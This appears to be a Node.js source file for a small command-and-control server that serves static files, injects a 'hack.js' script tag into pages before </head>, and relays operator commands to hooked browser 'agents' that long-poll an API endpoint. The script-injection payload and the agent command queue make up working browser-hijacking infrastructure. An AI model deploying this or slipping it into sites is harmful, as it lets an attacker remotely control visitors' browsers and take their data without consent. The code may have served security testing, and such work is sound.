const serveStatic = require('serve-static');
const fs = require("fs");
const $path = require('path');
const qs = require('querystring');
const http = require('http');
const finalhandler = require('finalhandler');
const payload = '<script id="script1" type="text/javascript" src="hack.js"></script></head>';
let port = 80;
let hostname = '127.0.0.1';
let reset = "\x1b[0m", green = "\x1b[32m", red = "\x1b[31m", blue = "\x1b[34m", black = "\x1b[1m" + "\x1b[30m";
let plus = (black + "[" + green + "+" + black +"]");
let appPath = "/Users/declan/Sencha/QuickStart/";
let agents = {}
let roots = {
    park: serveStatic( $path.resolve(__dirname, 'park'),{
        'index': ['index.html', 'index.htm']
    }),
    server: serveStatic(__dirname, {
        'index': ['index.html', 'index.htm']
    }),
    test1: serveStatic(appPath, {
        'index': ['index.html', 'index.htm']
    }),
    test2: serveStatic(appPath, {
        'index': ['index.html', 'index.htm']
    }),
    'messages': function(req, res){
          
    },
    '~api': function (req, res){
        if(req.method == 'POST'){
            console.log(black + "\n============================================");
            console.log(blue +  "Received post at url: ", green + req.url);
            console.log(blue +  "Agent Info: ", green, req.headers["user-agent"]);
            console.log(black + "============================================\n" + reset);
            if(req.url.startsWith('/cmd/')){
                cliHandler(req, res);
            }else if (req.url.startsWith('/park/')){
                commander(req, res, 60000);
            }
            else {
                console.log("Got bad response", req.url);
                commander(req, res, 60000);
            }
        }else{
            res.writeHead(200, {'Content-Type': 'application/json'});
            res.end(JSON.stringify({ status: 'failed', formData: '~api/ only accepts post requests' }));
            return;
        }
    }
}


function getAgent (id) {
    return agents[id] || (agents[id] = {
        id: id,
        queue: [],
        pending: {},
        seq: 0
    });
}

function flushAgentMessage (agent) {
    if (agent.response) {
        let clientMessage = agent.queue.shift();
        if (clientMessage) {
            if(agent.timerId){
                clearTimeout(agent.timerId);
                agent.timerId = null;
            }
            //console.log('clientMessage.data.id:',clientMessage.data.id);
            agent.pending[clientMessage.data.id] = clientMessage;
            agent.response.writeHead(200, {'Content-Type': 'application/json'});
            agent.response.end(JSON.stringify(clientMessage.data));
            agent.request = agent.response = null;
            return true;
        }
        if(!agent.timerId){
            agent.timerId = setTimeout(function(){
                agent.response.writeHead(200, {'Content-Type': 'application/json'});
                agent.response.end(JSON.stringify({
                                status: 'wait',
                                redirect: '/park/'
                            }));
                agent.request = agent.response = agent.timerId = null;
            }, 60000);
        }
    }
    return false;
}


function commander(req, res){
    try {
        let id = /[?&]id=([^&]+)/.exec(req.url);
        //console.log(req.url);
        id = id[1];
        let agent = getAgent(id);
        let requestBody = '';
        req.on('data', function (data) {
            requestBody += data;
        });

        req.on('end', function () {
            //console.log('1',requestBody);
            let reply = JSON.parse(requestBody);

            //Tell CLI data
            if (reply && reply.id) {
                let client = agent.pending[reply.id];
                delete agent.pending[reply.id];
                //console.log('12',reply);
                client.clientResponse.writeHead(200, {'Content-Type': 'application/json'});
                //console.log('123',reply.data);
                client.clientResponse.end(JSON.stringify(reply.data));
            }

            agent.request = req;
            agent.response = res;
            flushAgentMessage(agent);


        });
    }catch(e){console.log("Not a url...")}
}


function cliHandler(req, res){
    let msg = '';
    req.on('data', function(data) {
        msg += data;
    });
    req.on('end', function() {
        let cmdObj = JSON.parse(msg);
        let agent = getAgent(cmdObj.agent);
        console.log(black + "\n============================================");
        console.log(blue + "Received command to forward to client/s:", green + cmdObj.agent);
        console.log(blue + 'Queueing message:', green + msg);
        console.log(black + "============================================\n" + reset);
        agent.queue.push({
            data: {
                id: ++agent.seq,
                type: cmdObj.cmd.type,  
                data: cmdObj.cmd.data
            },
            clientResponse: res,
            clientRequest: req
        });
        //console.log(agent.queue);
        flushAgentMessage(agent);
        //let agentRes = getAgent(agent.id).response;
        //agentRes.writeHead(200, {'Content-Type': 'application/json'});
        //agentRes.end(JSON.stringify({
        //  success: true,
        //  cmd:cmdObj.cmd
        //}));
    });
}


function xcommander(req, res, timeout){
    try{
        let id = /[?&]id=([^&]+)/.exec(req.url);
        id = id[1];
        setTimeout(function(){
            res.writeHead(200, {'Content-Type': 'application/json'});
            res.end(JSON.stringify({
                            status: 'wait',
                            redirect: '/park/'
                        }));
            return console.log('reconnect');
        }, timeout);
    }catch(e){
        console.log('Bad client id!');
    }
}


function setup(){
    let serverServe = serveStatic(__dirname, {
        'index': ['index.html', 'index.htm']
    });
    let appServe = serveStatic(appPath, {
        'index': ['index.html', 'index.htm']
    });

    let server = http.createServer(function onRequest (req, res) {
        let match = /^\/([^\/]+)(\/.*)?/.exec(req.url);
        let root = match && roots[match[1]];
        if(!root){
            res.writeHead(302, {
                'Location': '/park/'
            });
            res.end();
        }else{
            req.url = match[2] || '/';
            root(req,res, finalhandler(req, res));
        }
    });
    
    server.listen(port, hostname, function(){
        return console.log(plus + blue + ' Started test server on' + green, hostname,
            blue+ 'at port' + green, port + reset);
        });
  }


if (process.argv.length < 4) {
    console.log(red + '[!] Not enough arguments! Syntax: node WebServer.js <hostname> <port>');
    console.log(reset);
} else {
    hostname = process.argv[2];
    port = process.argv[3];
    setup();
    console.log(reset);
}




/*if (req.url == '/' || req.url == '/index.html') {
            let data = fs.readFileSync(__dirname + 'index.html','utf-8');
            let data2 = data.split('</head>');
            let finaldata = data2[0] + payload + data2[1];
            fs.writeFileSync('/Users/declan/Sencha/perftest/foo.html', finaldata);
            req.url = '/foo.html';
            serverServe(req,res, finalhandler(req, res));
        } else {
            appServe(req,res, finalhandler(req, res));
        }*/